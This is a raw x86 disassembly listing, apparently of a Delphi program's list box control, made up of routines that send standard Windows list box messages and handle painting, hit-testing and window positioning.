mov ecx [ ebp - 0xc ]
mov edx edi
mov si 0xffaf
call sub_4483f8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0xdc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0xdc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_425b40
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_45f784
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x1c ]
call sub_48e5a8
sub_45f7b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x1c ]
movzx eax [ esi + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
push edi
mov eax esi
call sub_496868
or ecx 0xffffffff
mov edx 0x1a2
call sub_41f080
mov edx edi
mov eax esi
call sub_4611e0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f7f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45f8f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
movzx eax [ eax + 0x290 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8fb
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x8 ]
call sub_425a78
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ eax + 0x2d5 ] 0x1
xor eax eax
push ebp
push sub_45f8d7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ eax + 0x2d5 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_425b40
retn
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov si 0xffb0
call sub_4483f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
xor ecx ecx
mov edx ebx
mov si 0xffaf
call sub_4483f8
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov si 0xffaf
call sub_4483f8
sub_45f904
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_490f20
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_48d5f8
mov edx 0x61
mov eax ebx
call sub_48d62c
mov dl 0x1
mov eax ebx
call sub_496b44
xor edx edx
mov eax ebx
call sub_48e174
mov [ ebx + 0x268 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x270 ] esi
mov [ esi + 0x1c ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x280 ] esi
mov eax esi
mov edx ebx
call sub_48c730
mov [ ebx + 0x288 ] 0x10
mov [ ebx + 0x27c ] 0x1
mov [ ebx + 0x293 ] 0x1
mov [ ebx + 0x28c ] 0xffffffff
mov [ ebx + 0x2d0 ] 0x1f4
mov [ ebx + 0x2d4 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_45fa00
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x280 ]
call sub_4481b0
mov eax [ esi + 0x270 ]
call sub_4481b0
mov eax [ esi + 0x298 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45facc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45faec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop edi
pop esi
pop ebx
retn
sub_45fb2c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45fb4c
push ebx
mov ebx eax
movzx eax [ ebx + 0x290 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_45fb94
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x260 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax [ esi + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_460008
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_45fbdc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45fcf3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x260 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
mov eax [ ebx + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fcfa
lea eax [ ebp - 0x18 ]
mov edx 0x4
call j_sub_44936c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x270 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_449db8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_449ed8
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
mov eax [ ebx + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xe4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x270 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_449db8
mov edx eax
lea eax [ ebp - 0xc ]
call sub_449ed8
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xe4 ]
mov edx esi
mov eax ebx
call sub_45ffb8
test al al
je r-xdata
jmp r-xdata
sub_45fd04
push ebx
push esi
mov esi eax
cmp [ esi + 0x260 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
mov eax [ esi + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
mov eax [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_45ffb8
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_45fd70
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x284 ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_48d878
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x284 ]
fdivp st1
call sub_44796c
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov esi 0x1
sub_45fdc4
push ebx
mov ebx eax
cmp edx [ ebx + 0x284 ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
je r-xdata
mov [ ebx + 0x284 ] edx
mov eax ebx
call sub_492ec4
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x284 ] edx
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_45fd70
sub_45fe08
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x260 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
cmp esi eax
jl r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov esi eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
or esi 0xffffffff
sub_45fea0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x260 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_496868
push eax
call SendMessageW
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_496868
push eax
call SendMessageW
jmp r-xdata
sub_45ff24
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x288 ]
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x290 ] 0x0
jne r-xdata
mov ecx esp
xor edx edx
mov eax ebx
call sub_45ff60
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_45ffb8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_496868
push eax
call SendMessageW
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_460008
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x260 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
movzx eax bl
push eax
push 0x185
mov eax edi
call sub_496868
push eax
call SendMessageW
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_496868
push eax
call SendMessageW
push 0x0
push esi
push 0x186
mov eax edi
call sub_496868
push eax
call SendMessageW
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
jmp r-xdata
sub_4600dc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x290 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x290 ] bl
mov eax esi
call sub_492ec4
mov eax [ esi + 0x270 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_4600b8
sub_460134
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460201
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x2ba ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460208
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov eax [ esi + 0x8 ]
call sub_4360f0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ esi + 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_460210
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4602c7
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x2ba ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602ce
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ esi + 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_4602e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460118
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_460314
push esi
push edi
mov edi edx
mov esi eax
movzx eax [ esi + 0x290 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax esi
call sub_4600dc
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax esi
call sub_4600dc
jmp r-xdata
sub_46035c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_460118
mov ebp eax
mov eax [ esi + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebp
mov eax esi
call sub_45ff60
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_4603e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4926c0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4925ec
cmp [ ebx + 0x293 ] 0x0
je r-xdata
movzx eax [ ebx + 0x260 ]
mov esi [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x260 ]
mov esi [ eax * 4 + rw-data ]
jmp r-xdata
mov eax ebx
mov si 0xffc7
call sub_4483f8
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
movzx eax [ ebx + 0x290 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x292 ]
or edx [ eax * 4 + rw-data ]
or esi edx
movzx eax [ ebx + 0x291 ]
or esi [ eax * 4 + rw-data ]
cmp [ ebx + 0x284 ] 0x0
setne al
and eax 0x7f
or esi [ eax * 4 + rw-data ]
movzx eax [ ebx + 0x27c ]
or esi [ eax * 4 + rw-data ]
cmp [ ebx + 0x294 ] 0x0
setne al
and eax 0x7f
or esi [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] esi
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x27c ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_4604fd
add [ eax ] al
add [ eax + eax + 0x49 ] cl
add [ ebx ] dl
push esp
add [ edx ] al
dec edi
add [ eax ] bl
add [ eax ] al
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_4927d4
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_496868
push eax
call SetWindowPos
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_45fd70
mov eax [ ebx + 0x2a4 ]
test eax eax
je r-xdata
lea eax [ ebx + 0x294 ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax [ ebx + 0x28c ]
cmp eax 0xffffffff
jne r-xdata
mov edx eax
mov eax ebx
call sub_461220
movzx edx [ ebx + 0x290 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x298 ] 0x0
je r-xdata
mov eax [ ebx + 0x298 ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_4610b0
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x29c ]
mov eax ebx
call sub_4602e8
mov edx [ ebx + 0x2a0 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov [ ebx + 0x28c ] 0xffffffff
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x114 ]
lea eax [ ebx + 0x298 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
sub_4605fc
push ebx
push esi
mov ebx eax
test [ ebx + 0x55 ] 0x20
je r-xdata
mov eax ebx
call sub_492bec
pop esi
pop ebx
retn
mov eax ebx
call sub_461204
mov [ ebx + 0x2a4 ] eax
mov eax [ ebx + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
movzx eax [ ebx + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov esi eax
mov [ ebx + 0x298 ] esi
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x118 ]
mov eax [ ebx + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x28c ] eax
jmp r-xdata
mov eax ebx
call sub_460118
mov [ ebx + 0x29c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x2a0 ] eax
sub_46068c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0xb04d
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x2d4 ] 0x0
je r-xdata
sub eax 0xce7
jne r-xdata
mov eax ebx
call sub_48e800
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_4936a0
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov eax ebx
call sub_496868
pop edx
call sub_48ab7c
mov [ ebx + 0x2d4 ] 0x0
test [ ebx + 0x55 ] 0x80
je r-xdata
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
cmp [ ebx + 0x2d4 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4934ac
test al al
jne r-xdata
mov [ ebx + 0x2d4 ] 0x1
push 0x0
push 0x0
push 0xb04d
mov eax ebx
call sub_496868
push eax
call PostMessageW
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_460766
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
movzx eax [ edi + 0x4 ]
call sub_476e90
mov ebx eax
mov eax esi
call sub_48d12c
cmp al 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_48fcfc
mov eax esi
call sub_48d12c
cmp al 0x1
jne r-xdata
cmp [ esi + 0x260 ] 0x0
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x260 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_48e71c
test bl 0x4
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
mov cl 0x1
lea edx [ esp + 0x4 ]
mov eax esi
call sub_46035c
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_45ffb8
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_48e71c
jmp r-xdata
sub_46081c
push ebx
push esi
mov ebx eax
movzx eax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax ebx
call sub_48db88
mov eax ebx
mov si 0xffeb
call sub_4483f8
pop esi
pop ebx
retn
dec ax
je r-xdata
mov eax ebx
mov si 0xffea
call sub_4483f8
jmp r-xdata
pop esi
pop ebx
retn
sub_460854
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
xor eax eax
push ebp
push sub_460a50
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] 0xbc2b
mov eax [ edi ]
call sub_496868
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x5c ] 0x2
mov [ ebp - 0x50 ] 0x1
xor eax eax
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x44 ] eax
mov eax [ edi ]
call sub_496868
mov [ ebp - 0x58 ] eax
mov eax [ edi ]
call sub_496868
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x2c ] 0xbc2c
mov eax [ edi ]
call sub_496868
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x74 ] 0x2
mov eax [ edi ]
call sub_496868
mov [ ebp - 0x70 ] eax
xor esi esi
mov eax [ edi ]
call sub_460118
mov ebx eax
lea eax [ ebp - 0x84 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dd60
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4608e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0xc ]
call sub_46df1c
mov eax [ ebp - 0xc ]
call sub_46df70
push eax
lea edx [ ebp - 0x94 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x94 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a57
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a57
retn
mov [ ebp - 0x6c ] ebx
mov eax [ edi ]
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x68 ] eax
mov eax [ edi ]
mov eax [ eax + 0x288 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x54 ] ebx
lea edx [ ebp - 0x2c ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x64 ]
add eax esi
push eax
lea eax [ ebp - 0x94 ]
push eax
mov ecx [ ebp - 0x68 ]
mov edx esi
xor eax eax
call sub_422fe4
push esi
push edi
lea esi [ ebp - 0x94 ]
lea edi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x1c ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x64 ]
add esi eax
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x270 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x60 ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_460a60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
